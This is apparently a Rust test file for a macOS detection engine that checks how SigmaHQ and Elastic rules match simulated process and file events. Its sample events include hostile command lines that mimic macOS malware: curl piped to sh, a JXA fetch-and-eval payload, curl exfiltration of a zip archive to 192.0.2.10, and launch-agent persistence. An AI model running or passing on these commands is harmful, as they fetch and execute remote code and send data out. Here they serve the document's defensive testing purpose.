                "{curl}  s2: {{\"process.args|contains\": [\"\\u0000-k\\u0000\"]}}\n  condition: s1 and s2\n"
            ),
            CATEGORY,
            "",
        );
        let needs = translated(
            &format!(
                "{curl}  s2: {{\"process.parent.args|contains\": [\"x\"]}}\n  condition: s1 and s2\n"
            ),
            CATEGORY,
            "",
        );
        let part = translated(
            &format!("{curl}  condition: s1\n"),
            CATEGORY,
            "\"needs_fields process.parent.command_line\", \"backslash_in_wildcard process.executable: C:\\\\*\"",
        );
        let alternative = translated(
            "  s1: [{\"process.name|cased\": [\"curl\"]}, {\"process.Ext.effective_parent.name\": [\"x\"]}]\n  condition: s1\n",
            CATEGORY,
            "",
        );
        let bare = Box::leak(
            whole
                .replace(&record_of(&ELASTIC, "\"high\"", ""), "")
                .into_boxed_str(),
        );
        let rules = Rules::load_as(
            &ELASTIC,
            &[
                ("whole.yml", whole),
                ("needs.yml", needs),
                ("part.yml", part),
                ("alternative.yml", alternative),
                ("bare.yml", bare),
            ],
        );
        assert_eq!(rules.rules[0].placement, Placement::Evaluated);
        assert!(
            matches!(&rules.rules[0].need, Need::All(n) if !n.contains(&Need::Never)),
            "{:?}",
            rules.rules[0].need
        );
        assert_eq!(
            rules.rules[1].placement,
            Placement::NotEvaluated(Reason::NeedsFields(vec!["process.parent.args".into()]))
        );
        assert_eq!(
            rules.rules[2].placement,
            Placement::InPart(vec![
                Branch {
                    selection: None,
                    fields: vec!["process.parent.command_line".into()],
                    said: Some("needs_fields process.parent.command_line".into()),
                },
                Branch {
                    selection: None,
                    fields: vec![],
                    said: Some("backslash_in_wildcard process.executable: C:\\*".into()),
                },
            ])
        );
        assert_eq!(
            rules.rules[3].placement,
            Placement::InPart(vec![Branch {
                selection: Some("s1".into()),
                fields: vec!["process.Ext.effective_parent.name".into()],
                said: None,
            }])
        );
        assert_eq!(
            rules.rules[4].placement,
            Placement::NotEvaluated(Reason::NotParsed(
                "the translation's record `elastic` is missing or not a mapping of plain keys"
                    .into()
            ))
        );
        assert_eq!(
            rules.rules[2].meta.as_ref().unwrap().name,
            "elastic:00000000-0000-4000-8000-000000000009"
        );
        let insecure = start(
            "/usr/bin/curl",
            &["curl", "-k", "https://example.invalid"],
            "/bin/zsh",
        );
        let hit: Vec<&str> = rules.evaluate(&insecure).iter().map(|m| m.file).collect();
        assert_eq!(hit, ["whole.yml", "part.yml", "alternative.yml"]);
        assert_eq!(asked_of(&rules, &insecure).len(), 3);
        // Without the argument the whole rule is not asked, and does not match.
        let plain = start(
            "/usr/bin/curl",
            &["curl", "https://example.invalid"],
            "/bin/zsh",
        );
        assert!(!asked_of(&rules, &plain).contains(&"whole.yml"));
        let ls = start("/bin/ls", &["ls"], "/bin/zsh");
        assert!(asked_of(&rules, &ls).is_empty());
        // The same rule read as SigmaHQ's names fields its schema does not give.
        let as_sigma = Rules::load(&[("whole.yml", whole)]);
        assert_eq!(
            as_sigma.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsFields(vec![
                "process.args".into(),
                "process.name".into()
            ]))
        );
    }

    /// SigmaHQ's rules match what they matched before another set was shipped beside them:
    /// over every event the fast path's test makes, the rules of SigmaHQ's set alone and the
    /// same rules among all the sets match the same, and are placed the same.
    #[test]
    fn sigmahq_s_rules_match_as_they_did_alone() {
        let alone = Rules::of(&[&SIGMAHQ]);
        let all = Rules::shipped();
        let sigma = |rules: &Rules, s: Subject| -> Vec<&'static str> {
            rules
                .evaluate(s)
                .iter()
                .filter(|m| std::ptr::eq(m.meta.source, &SIGMAHQ))
                .map(|m| m.file)
                .collect()
        };
        let (starts, files) = starts_from_rules();
        let mut matched = 0;
        for s in starts.iter().flat_map(variants) {
            let before = sigma(&alone, Subject::Start(&s));
            matched += before.len();
            assert_eq!(before, sigma(all, Subject::Start(&s)), "{s:?}");
        }
        for f in files.iter().flat_map(file_variants) {
            assert_eq!(
                sigma(&alone, Subject::File(&f)),
                sigma(all, Subject::File(&f)),
                "{f:?}"
            );
        }
        assert!(matched > 100, "{matched}");
        for (a, b) in alone.rules.iter().zip(&all.rules) {
            assert_eq!((a.file, &a.placement), (b.file, &b.placement));
        }
    }

    /// How a set's schema decides what is done to an event: SigmaHQ's rules see a path in
    /// `/private` under its short name too, since their authors write `/tmp/...`; Elastic's
    /// translated rules see the path only as Endpoint Security gives it, as their translation
    /// was checked.
    #[test]
    fn only_sigmahq_s_rules_see_a_path_through_macos_links_into_private() {
        assert!(SIGMA_TAXONOMY.links);
        assert!(!ECS.links);
        let elastic = Rules::load_as(
            &ELASTIC,
            &[(
                "tmp.yml",
                translated(
                    "  s1: {\"file.path|cased\": [\"/tmp/x/*\"]}\n  condition: s1\n",
                    FILE_CATEGORY,
                    "",
                ),
            )],
        );
        let sigma = Rules::load(&[(
            "tmp.yml",
            "title: Invented\nid: 00000000-0000-4000-8000-000000000008\nstatus: test\n\
             level: high\nlogsource:\n    category: file_event\n    product: macos\n\
             detection:\n    selection:\n        TargetFilename|startswith: '/tmp/x/'\n    condition: selection\n",
        )]);
        let resolved = file("/bin/cp", "/private/tmp/x/a", None);
        let short = file("/bin/cp", "/tmp/x/a", None);
        assert!(elastic.evaluate(&resolved).is_empty());
        assert_eq!(elastic.evaluate(&short).len(), 1);
        assert_eq!(elastic.evaluate_each(&resolved).len(), 0);
        assert_eq!(sigma.evaluate(&resolved).len(), 1);
    }

    /// Every part of an event a translated rule reads, under Elastic's name, as the translation
    /// was checked on: the program's name is the last part of its path, the arguments one text
    /// with each between NULs and absent when there are none, their count a number, a file's
    /// name and extension from its path, the kind of event and its action Elastic Defend's
    /// words, and every text folded too.
    #[test]
    fn an_event_is_given_to_elastic_s_rules_under_elastic_s_names() {
        let layout = Layout::new(&ECS);
        let given = |subject: Subject, kind: Kind| -> BTreeMap<String, Option<String>> {
            let values = layout.forms(subject).remove(0);
            layout
                .names(kind)
                .iter()
                .cloned()
                .zip(values[layout.range(kind)].iter().cloned())
                .collect()
        };
        let mut s = start("/usr/bin/Curl", &["curl", "-K", "a b"], "/bin/zsh");
        s.working_directory = Some("/Users/example".into());
        s.user_id = Some(0);
        let want: BTreeMap<String, Option<String>> = [
            ("event.type", "start"),
            ("event.action", "exec"),
            ("process.executable", "/usr/bin/Curl"),
            ("process.name", "Curl"),
            ("process.args", "\0curl\0-K\0a b\0"),
            ("process.args_count", "3"),
            ("process.command_line", "curl -K a b"),
            ("process.parent.executable", "/bin/zsh"),
            ("process.parent.name", "zsh"),
            ("process.working_directory", "/Users/example"),
            ("user.id", "0"),
        ]
        .into_iter()
        .flat_map(|(n, v)| {
            let folded =
                (n != "process.args_count").then(|| (format!("immune.folded.{n}"), Some(fold(v))));
            [(n.to_string(), Some(v.to_string()))]
                .into_iter()
                .chain(folded)
        })
        .collect();
        assert_eq!(given(Subject::Start(&s), Kind::Process), want);
        let bare = ProcessStart {
            executable: "/bin/x".into(),
            ..ProcessStart::default()
        };
        let none = given(Subject::Start(&bare), Kind::Process);
        for absent in [
            "process.args",
            "process.parent.executable",
            "process.parent.name",
            "process.working_directory",
            "user.id",
        ] {
            assert_eq!(none[absent], None, "{absent}");
        }
        assert_eq!(none["process.args_count"].as_deref(), Some("0"));
        // The count is given as a number, so a rule can compare it.
        let count = |rule: &str| {
            let rules = Rules::load_as(
                &ELASTIC,
                &[(
                    "count.yml",
                    translated(
                        &format!("  s1: {{{rule}}}\n  condition: s1\n"),
                        CATEGORY,
                        "",
                    ),
                )],
            );
            rules.evaluate(&s).len()
        };
        assert_eq!(count("\"process.args_count|lte\": 3"), 1);
        assert_eq!(count("\"process.args_count|lt\": 3"), 0);
        assert_eq!(count("\"process.args_count\": 3"), 1);
        // A file created, and one renamed; the signing id of the program that did it only
        // where the line gives it.
        let created = given(
            Subject::File(&FileEvent {
                signing_id: Some("com.example.Java".into()),
                ..file("/usr/bin/Java", "/opt/a/B.Class", None)
            }),
            Kind::File,
        );
        let renamed = given(
            Subject::File(&file("/bin/mv", "/Users/example/.bashrc", Some("/tmp/a"))),
            Kind::File,
        );
        let pick = |m: &BTreeMap<String, Option<String>>, names: &[&str]| -> Vec<Option<String>> {
            names.iter().map(|n| m[*n].clone()).collect()
        };
        let names = [
            "event.type",
            "event.action",
            "file.path",
            "file.name",
            "file.extension",
            "process.executable",
            "process.name",
            "immune.folded.file.name",
            "process.code_signature.signing_id",
        ];
        let some =
            |v: &[&str]| -> Vec<Option<String>> { v.iter().map(|s| Some(s.to_string())).collect() };
        assert_eq!(
            pick(&created, &names),
            some(&[
                "creation",
                "creation",
                "/opt/a/B.Class",
                "B.Class",
                "Class",
                "/usr/bin/Java",
                "Java",
                "b.class",
                "com.example.Java"
            ])
        );
        let mut want = some(&[
            "change",
            "rename",
            "/Users/example/.bashrc",
            ".bashrc",
            "",
            "/bin/mv",
            "mv",
            ".bashrc",
            "",
        ]);
        want[4] = None;
        want[8] = None;
        assert_eq!(pick(&renamed, &names), want);
        assert_eq!(created.len(), 8 + 8);
        for (path, extension) in [
            ("/tmp/notes.", None),
            ("/tmp/a.tar.gz", Some("gz")),
            ("/tmp/.d/x", None),
        ] {
            let f = given(Subject::File(&file("/bin/cp", path, None)), Kind::File);
            assert_eq!(f["file.extension"].as_deref(), extension, "{path}");
        }
    }

    /// No false calm over an older log. A rule that reads a field only a collector that keeps
    /// one of `KEEPS` fills is not asked about a line whose collector did not keep it: such a
    /// line lacks the field, and a rule that negates it would match, one that asks for it would
    /// miss, either way judging what the line cannot say. What it needs is known from every
    /// field it names, a folded copy included; a rule that names none is asked as before.
    #[test]
    fn a_rule_that_reads_what_an_earlier_collector_did_not_keep_is_not_asked_about_its_lines() {
        use crate::events::{IDENTITY, SCRIPT, SIGNATURE};
        let load = |s2: &str| {
            Rules::load_as(
                &ELASTIC,
                &[(
                    "signer.yml",
                    translated(
                        &format!(
                            "  s1: {{\"file.name|cased\": [\"StartupParameters.plist\"]}}\n  s2: {{{s2}}}\n  condition: \"s1 and not s2\"\n"
                        ),
                        FILE_CATEGORY,
                        "",
                    ),
                )],
            )
        };
        let plist = "/Library/StartupItems/x/StartupParameters.plist";
        let signed = |id: Option<&str>, kept| FileEvent {
            signing_id: id.map(str::to_string),
            kept,
            ..file("/bin/cp", plist, None)
        };
        let both = |rules: &Rules, f: &FileEvent| {
            let fired = rules.evaluate(f).len();
            assert_eq!(fired, rules.evaluate_each(f).len());
            fired
        };
        for s2 in [
            "\"process.code_signature.signing_id|cased\": [\"com.apple.shove\"]",
            "\"immune.folded.process.code_signature.signing_id|re\": \"^com\\\\.apple\\\\.shove$\"",
        ] {
            let rules = load(s2);
            let l = &rules.rules[0];
            assert_eq!(l.placement, Placement::Evaluated, "{s2}");
            assert_eq!(
                (l.needs, l.needs_fields.as_slice()),
                (
                    SIGNATURE,
                    ["process.code_signature.signing_id".to_string()].as_slice()
                ),
                "{s2}"
            );
            assert!(l.silenced_by(SIGNATURE) && !l.silenced_by(IDENTITY | SCRIPT));
            let now = IDENTITY | SIGNATURE;
            assert_eq!(
                both(&rules, &signed(Some("com.example.cp"), now)),
                1,
                "{s2}"
            );
            assert_eq!(
                both(&rules, &signed(Some("com.apple.shove"), now)),
                0,
                "{s2}"
            );
            // Kept, and eslogger gave none: the rule judges the line.
            assert_eq!(both(&rules, &signed(None, now)), 1, "{s2}");
            // A line of a collector that did not keep it: never asked.
            assert_eq!(both(&rules, &signed(None, IDENTITY)), 0, "{s2}");
        }
        // A selection that is a list of maps names its fields as much as one map does.
        let listed = Rules::load_as(
            &ELASTIC,
            &[(
                "listed.yml",
                translated(
                    "  s1: [{\"process.name|cased\": [\"cp\"]}, {\"process.code_signature.signing_id|cased\": [\"x\"]}]\n  condition: s1\n",
                    FILE_CATEGORY,
                    "",
                ),
            )],
        );
        assert_eq!(listed.rules[0].needs, SIGNATURE);
        // A rule that judges nothing here anyway is not said to be silenced by the collector.
        let never = load(
            "\"process.code_signature.signing_id|cased\": [\"com.apple.shove\"], \"process.code_signature.trusted\": true",
        );
        assert!(matches!(
            never.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsFields(_))
        ));
        assert_eq!(never.rules[0].needs, SIGNATURE);
        assert!(!never.rules[0].silenced_by(SIGNATURE));
        let plain = load("\"process.name|cased\": [\"cp\"]");
        assert_eq!(plain.rules[0].needs, 0);
        assert!(!plain.rules[0].silenced_by(crate::events::ALL_KEPT));
        assert_eq!(both(&plain, &signed(None, 0)), 0);
        assert_eq!(
            both(
                &plain,
                &FileEvent {
                    executable: "/bin/mv".into(),
                    ..signed(None, 0)
                }
            ),
            1
        );
        // A program start is judged by what its own line carries the same way.
        let cwd = testing::process_kept();
        assert_eq!(cwd.rules[0].needs, SCRIPT);
        let at = |kept| ProcessStart {
            working_directory: Some("/Users/x".into()),
            kept,
            ..start("/bin/cp", &[], "/bin/zsh")
        };
        assert_eq!(cwd.evaluate(&at(SCRIPT)).len(), 1);
        assert_eq!(cwd.evaluate_each(&at(SCRIPT)).len(), 1);
        assert_eq!(cwd.evaluate(&at(IDENTITY | SIGNATURE)).len(), 0);
        assert_eq!(cwd.evaluate_each(&at(IDENTITY | SIGNATURE)).len(), 0);
    }

    /// Elastic's severity is the level of the same name, and the rule's id and name are
    /// Elastic's own, so a finding and a listing name the rule as Elastic does.
    #[test]
    fn an_elastic_rule_keeps_its_severity_id_and_name() {
        let rules = Rules::shipped();
        for (path, text) in ELASTIC_SHIPPED {
            let yaml: Value = serde_norway::from_str(text).unwrap();
            let l = rules
                .rules
                .iter()
                .find(|l| std::ptr::eq(l.source, &ELASTIC) && l.file == *path)
                .unwrap();
            let m = l.meta.as_ref().unwrap();
            assert_eq!(m.level_name(), yaml["elastic"]["severity"].as_str());
            assert_eq!(Some(m.id.as_str()), yaml["elastic"]["rule_id"].as_str());
            assert_eq!(m.name, format!("elastic:{}", m.id));
            assert_eq!(Some(m.title.as_str()), yaml["title"].as_str());
            assert!(
                m.author
                    .as_deref()
                    .is_some_and(|a| a.starts_with("Elastic"))
            );
        }
    }

    /// Every behaviour rule is loaded as its own file says: no level, since its record states no
    /// severity and no risk score, and Elastic's id and name, so a listing names it as Elastic
    /// does. A file whose record states a severity would not load (see
    /// `a_rule_of_a_set_that_states_no_level_is_evaluated_and_raises_nothing_by_itself`).
    #[test]
    fn an_elastic_behaviour_rule_keeps_its_id_and_name_and_states_no_level() {
        let rules = Rules::shipped();
        for (path, text) in ELASTIC_BEHAVIOUR_SHIPPED {
            let yaml: Value = serde_norway::from_str(text).unwrap();
            let l = rules
                .rules
                .iter()
                .find(|l| std::ptr::eq(l.source, &ELASTIC_BEHAVIOUR) && l.file == *path)
                .unwrap();
            let m = l.meta.as_ref().unwrap();
            assert!(yaml["elastic"]["severity"].is_null(), "{path}");
            assert!(yaml["elastic"]["risk_score"].is_null(), "{path}");
            assert!(
                yaml.as_mapping()
                    .unwrap()
                    .keys()
                    .filter_map(Value::as_str)
                    .all(|k| !k.eq_ignore_ascii_case("level")),
                "{path}"
            );
            assert_eq!(m.level, None, "{path}");
            assert_eq!(Some(m.id.as_str()), yaml["elastic"]["rule_id"].as_str());
            assert_eq!(m.name, format!("elastic-behaviour:{}", m.id));
            assert_eq!(Some(m.title.as_str()), yaml["title"].as_str());
        }
    }

    /// The titles that rules of more than one set have, without case, each with its sets: among
    /// the rules `which` keeps.
    fn shared_titles(which: impl Fn(&Loaded) -> bool) -> Vec<(String, Vec<&'static str>)> {
        let mut sets_of: BTreeMap<String, BTreeSet<&str>> = BTreeMap::new();
        for l in Rules::shipped().rules.iter().filter(|l| which(l)) {
            let m = l.meta.as_ref().unwrap();
            sets_of
                .entry(m.title.to_lowercase())
                .or_default()
                .insert(l.source.name);
        }
        sets_of
            .into_iter()
            .filter(|(_, sets)| sets.len() > 1)
            .map(|(title, sets)| (title, sets.into_iter().collect()))
            .collect()
    }

    /// Rules of different sets can have the same title, under different ids: an event that
    /// matches both is counted once in each set, and a listing tells them apart by their set.
    /// The titles are counted here from the loaded rules, without case, among the rules
    /// evaluated, wholly or in part, and among all listed, taken or not; the documents give
    /// both numbers and name every title the evaluated rules share, so a set that brings a new
    /// one fails until they say so.
    #[test]
    fn every_title_two_sets_share_is_named_in_the_documents() {
        let listed = shared_titles(|l| l.meta.is_some());
        let shared =
            shared_titles(|l| matches!(l.placement, Placement::Evaluated | Placement::InPart(_)));
        let shared: Vec<(&str, Vec<&str>)> = shared
            .iter()
            .map(|(t, s)| (t.as_str(), s.clone()))
            .collect();
        assert_eq!(
            shared,
            [
                (
                    "dumping account hashes via built-in commands",
                    vec!["elastic", "elastic-behaviour"]
                ),
                (
                    "modification of safari settings via defaults command",
                    vec!["elastic", "elastic-behaviour"]
                ),
                (
                    "potential kerberos attack via bifrost",
                    vec!["elastic", "elastic-behaviour"]
                ),
                (
                    "potential privacy control bypass via localhost secure copy",
                    vec!["elastic", "elastic-behaviour"]
                ),
                (
                    "potential xcsset malware infection",
                    vec!["elastic-behaviour", "sigma"]
                ),
                (
                    "unexpected child process of macos screensaver engine",
                    vec!["elastic", "elastic-behaviour"]
                ),
            ]
        );
        let docs = include_str!("../docs/event-level.md").to_lowercase();
        let notice = include_str!("../rules/elastic-behaviour/NOTICE")
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .to_lowercase();
        for (title, _) in &shared {
            assert!(
                docs.contains(title),
                "docs/event-level.md does not name {title}"
            );
            assert!(
                notice.contains(title),
                "the behaviour NOTICE does not name {title}"
            );
        }
        // Both numbers, from the loaded rules, in both documents.
        let said = format!(
            "{} titles are shared by two sets among the rules evaluated, and {} among all the rules listed, taken or not",
            shared.len(),
            listed.len()
        );
        assert!(
            docs.contains(&said),
            "docs/event-level.md does not say: {said}"
        );
        assert!(
            notice.contains(&said),
            "the behaviour NOTICE does not say: {said}"
        );
    }

    /// The shipped rules for file events, by id.
    const FILE_RULES: [&str; 5] = [
        "23c43900-e732-45a4-8354-63e4a6c187ce",
        "2db0458c-05c9-4069-a26f-77becd9c8c13",
        "4f394635-13ef-4599-b677-3353e0f84f55",
        "dfe8b941-4e54-4242-b674-6b613d521962",
        "e710a880-1f18-4417-b6a0-b5afdf7e3023",
    ];

    /// The Detection Rule License: the shipped rules carry the URI of the rule set and of the
    /// licence, and the commit they were copied at is the one the program reports.
    #[test]
    fn the_notice_names_the_source_the_commit_and_the_licence() {
        let notice = include_str!("../rules/sigma/NOTICE");
        assert!(notice.contains(SOURCE));
        assert!(notice.contains(COMMIT));
        assert!(notice.contains("https://github.com/SigmaHQ/Detection-Rule-License"));
        assert!(notice.contains("Detection Rule License (DRL) 1.1"));
    }

    /// The drill. Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
    /// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as `DRILL` writes their commands,
    /// each raise "Binary Padding - MacOS", and the summary says so; copying a file with `dd`
    /// and an ordinary `truncate` do not. A match carries what a finding will need, the rule's
    /// authors included.
    #[test]
    fn the_binary_padding_drill_fires_and_its_near_misses_do_not() {
        let rules = Rules::shipped();
        assert_eq!(DRILL_RULE, BINARY_PADDING);
        let tests: BTreeSet<&str> = DRILL.iter().map(|(t, _, _)| *t).collect();
        assert_eq!(
            tests,
            BTreeSet::from([
                "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
                "e22a9e89-69c7-410f-a473-e6c212cd2292"
            ])
        );
        for (_, image, args) in DRILL {
            assert!(
                fires(rules, BINARY_PADDING, &drill_start(image, args)),
                "{args:?}"
            );
        }
        let s = rules.summary_json();
        for d in s["drill"].as_array().unwrap() {
            assert_eq!(d["raised"], true, "{d}");
        }
        assert!(
            rules
                .summary_lines(None)
                .iter()
                .any(|l| l == "Drill, Atomic Red Team T1027.001: 4 of 4 program starts raise Binary Padding - MacOS.")
        );
        let truncate = drill_start("/usr/bin/truncate", DRILL[3].2);
        assert_eq!(
            s["drill"][3]["matches"],
            json!([{
                "name": format!("sigma:{BINARY_PADDING}"),
                "source": "sigma",
                "set": "SigmaHQ's rule set",
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "events": "process_creation",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
                "techniques": ["T1027.001"],
                "author_text": "Igor Fits, Mikhail Larin, oscd.community",
            }])
        );

        let copy = start("/bin/dd", &["dd", "if=a", "of=b"], "/bin/zsh");
        assert!(!fires(rules, BINARY_PADDING, &copy));
        let cut = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "0", "f"],
            "/bin/zsh",
        );
        assert!(!fires(rules, BINARY_PADDING, &cut));

        let m = rules.evaluate(&truncate);
        let m = m.iter().find(|m| m.meta.id == BINARY_PADDING).unwrap();
        assert_eq!(m.meta.title, "Binary Padding - MacOS");
        assert_eq!(m.meta.level, Some(Level::High));
        assert_eq!(m.meta.status, Status::Test);
        assert_eq!(m.meta.techniques, ["T1027.001"]);
        assert_eq!(
            m.meta.author.as_deref(),
            Some("Igor Fits, Mikhail Larin, oscd.community")
        );
        assert_eq!(
            m.file,
            "rules/macos/process_creation/proc_creation_macos_binary_padding.yml"
        );
    }

    /// For each rule that can raise a finding, by its id, a start it must fire on and a near
    /// miss it must stay silent on, written from what the rule describes.
    fn high_samples() -> Vec<(&'static str, ProcessStart, ProcessStart)> {
        vec![
            (
                // Amos: curl posting the archive it collected, with its build headers.
                "e710a880-1f18-4417-b6a0-b5afdf7e33da",
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-H",
                        "user: 7f3a",
                        "-H",
                        "BuildID: c0ffee",
                        "-H",
                        "cl: 0",
                        "--max-time",
                        "300",
                        "-F",
                        "file=@/tmp/out.zip",
                        "http://192.0.2.10/contact",
                    ],
                    "/bin/sh",
                ),
                // An ordinary upload of a zip with curl.
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-F",
                        "file=@/tmp/report.zip",
                        "https://example.invalid/upload",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // Axios npm compromise: the dropper starts its AppleScript in the background.
                "a09ee860-31b3-4586-8a68-0ebd74ce0e5f",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "nohup osascript /tmp/6202033 > /dev/null 2>&1 &",
                    ],
                    "/usr/local/bin/node",
                ),
                // Cleaning a build folder.
                start("/bin/rm", &["rm", "-rf", "/tmp/build-cache"], "/bin/zsh"),
            ),
            (
                BINARY_PADDING,
                start(
                    "/bin/dd",
                    &["dd", "if=/dev/urandom", "bs=1", "count=1"],
                    "/bin/sh",
                ),
                start(
                    "/bin/dd",
                    &["dd", "if=disk.img", "of=/dev/rdisk9", "bs=1m"],
                    "/bin/zsh",
                ),
            ),
            (
                // Searching files for passwords with grep.
                "53b1b378-9b06-4992-b972-dde6e423d2b4",
                start(
                    "/usr/bin/grep",
                    &["grep", "-ri", "password", "/tmp/notes"],
                    "/bin/zsh",
                ),
                start("/usr/bin/grep", &["grep", "-r", "TODO", "src"], "/bin/zsh"),
            ),
            (
                // A Word macro starting a shell.
                "69483748-1525-4a6c-95ca-90dc8d431b68",
                start(
                    "/bin/sh",
                    &["sh", "-c", "curl -s http://192.0.2.10/a | sh"],
                    "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
                ),
                // A shell starting a shell in a terminal.
                start("/bin/sh", &["sh", "-c", "ls"], "/bin/zsh"),
            ),
            (
                // JXA fetching and evaluating a script in memory.
                "f1408a58-0e94-4165-b80a-da9f96cf6fc3",
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.0.2.10/p')),$.NSUTF8StringEncoding)))",
                    ],
                    "/bin/zsh",
                ),
                // JXA asking Finder for its name.
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "Application('Finder').name()",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // PlistBuddy making a launch agent run at load.
                "65d506d3-fcfe-4071-b4b2-bcefe721bbbb",
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Add :RunAtLoad bool true",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
                // Turning it off again.
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Set :RunAtLoad false",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // A run-only script compiled from a one-liner.
                "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
                start(
                    "/usr/bin/osacompile",
                    &[
                        "osacompile",
                        "-x",
                        "-e",
                        "do shell script \"id\"",
                        "-o",
                        "/tmp/a.scpt",
                    ],
                    "/bin/sh",
                ),
                // An ordinary compile that keeps the source.
                start(
                    "/usr/bin/osacompile",
                    &["osacompile", "-o", "/tmp/a.scpt", "/tmp/a.applescript"],
                    "/bin/zsh",
                ),
            ),
            (
                // MeshAgent renamed, still given its service name.
                RENAMED_MESHAGENT,
                start(
                    "/tmp/.helper",
                    &["/tmp/.helper", "--meshServiceName", "Support"],
                    "/bin/sh",
                ),
                // MeshAgent under its own name.
                start(
                    "/opt/mesh/meshagent",
                    &["/opt/mesh/meshagent", "--meshServiceName", "Support"],
                    "/sbin/launchd",
                ),
            ),
            (
                // A bash one-liner cutting base64 out of an image and decoding it.
                "09a910bf-f71f-4737-9c40-88880ba5913d",
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +21453 '/Volumes/Installer/logo.jpeg' | base64 --decode > /tmp/x.zip",
                    ],
                    "/bin/sh",
                ),
                // The same from a text file.
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +100 notes.txt | base64 --decode > /tmp/x.bin",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // WizardUpdate: sh evaluating what curl fetched.
                "f68c4a4f-19ef-4817-952c-50dce331f4b0",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "s=$(curl -fsL http://192.0.2.10/i); eval \"$s\"",
                    ],
                    "/bin/bash",
                ),
                // sh keeping what curl fetched without running it.
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "v=$(curl -fsL https://example.invalid/version); echo $v",
                    ],
                    "/bin/bash",
                ),
            ),
        ]
    }

    const AMOS_FILES: &str = "e710a880-1f18-4417-b6a0-b5afdf7e3023";
    const AXIOS_FILES: &str = "2db0458c-05c9-4069-a26f-77becd9c8c13";

    /// The same for the rules for file events, a file event each, as Endpoint Security gives
    /// paths: resolved, `/private/tmp` for `/tmp`.
    fn file_high_samples() -> Vec<(&'static str, FileEvent, FileEvent)> {
        vec![
            (
                // Amos: its launch daemon renamed into place. Where it went is the target.
                AMOS_FILES,
                file(
                    "/bin/mv",
                    "/Library/LaunchDaemons/com.finder.helper.plist",
                    Some("/private/tmp/7f3a.plist"),
                ),
                // The same file renamed away: where it came from is not the target.
                file(
                    "/bin/mv",
                    "/private/tmp/7f3a.plist",
                    Some("/Library/LaunchDaemons/com.finder.helper.plist"),
                ),
            ),
            (
                // Axios: node writes the dropper to /tmp, which macOS resolves to /private/tmp.
                AXIOS_FILES,
                file("/usr/local/bin/node", "/private/tmp/6202033", None),
                file("/usr/local/bin/node", "/private/tmp/6202034", None),
            ),
        ]
    }

    /// Every rule that can raise a finding, high or critical and evaluated, has one event it
    /// must fire on and one near miss it must stay silent on, written from what the rule
    /// describes. A new such rule without samples fails here.
    #[test]
    fn every_high_rule_fires_on_its_sample_and_not_on_its_near_miss() {
        let rules = Rules::shipped();
        let samples = high_samples();
        let files = file_high_samples();
        // SigmaHQ's: a translated rule's samples are its translation's reference's, not
        // written here from the rule.
        let high: BTreeSet<&str> = rules
            .rules
            .iter()
            .filter(|l| std::ptr::eq(l.source, &SIGMAHQ))
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .filter_map(|l| l.meta.as_ref())
            .filter(|m| m.raises())
            .map(|m| m.id.as_str())
            .collect();
        let sampled: BTreeSet<&str> = samples
            .iter()
            .map(|(id, _, _)| *id)
            .chain(files.iter().map(|(id, _, _)| *id))
            .collect();
        assert_eq!(
            high, sampled,
            "every high rule that is evaluated has samples"
        );
        for (id, hit, miss) in &samples {
            assert!(fires(rules, id, hit), "{id} fires on its sample");
            assert!(
                !fires(rules, id, miss),
                "{id} stays silent on its near miss"
            );
        }
        for (id, hit, miss) in &files {
            assert!(fires(rules, id, hit), "{id} fires on its sample");
            assert!(
                !fires(rules, id, miss),
                "{id} stays silent on its near miss"
            );
        }
    }

    /// A rule's author writes `/tmp/x`; Endpoint Security gives `/private/tmp/x`, the path it
    /// resolved through the link every Mac has. The file is known by both names, so the rule
    /// sees it, and a rule written with `/private/var` still sees the path as given. Nothing
    /// else is a name of it: a folder that merely ends in `private` gives no second name.
    #[test]
    fn a_file_is_known_by_its_path_and_through_macos_links_into_private() {
        let rules = Rules::shipped();
        let node = "/usr/local/bin/node";
        assert!(fires(
            rules,
            AXIOS_FILES,
            &file(node, "/private/tmp/6202033", None)
        ));
        assert!(fires(rules, AXIOS_FILES, &file(node, "/tmp/6202033", None)));
        let emond = "23c43900-e732-45a4-8354-63e4a6c187ce";
        let client = file("/bin/cp", "/private/var/db/emondClients/x", None);
        assert!(fires(rules, emond, &client));
        let names = |p: &str| -> Vec<String> {
            file("/bin/cp", p, None)
                .names()
                .iter()
                .map(|n| n.to_string())
                .collect()
        };
        assert_eq!(
